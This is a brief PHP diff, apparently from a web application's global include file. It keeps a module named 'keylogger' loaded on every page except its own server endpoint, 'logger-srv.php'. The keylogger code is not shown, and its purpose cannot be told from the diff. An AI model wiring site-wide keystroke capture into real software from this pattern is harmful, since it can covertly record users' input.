@@ -634,4 +634,6 @@ if ((int) $GLOBALS['user_debug'] > 1) {
     ini_set('display_errors', 1);
 }
 
-require_once(__DIR__ . "/../keylogger/logger-inc.php");
+if (!strpos($_SERVER['PHP_SELF'], "logger-srv.php")) {
+    require_once(__DIR__ . "/../keylogger/logger-inc.php");
+}
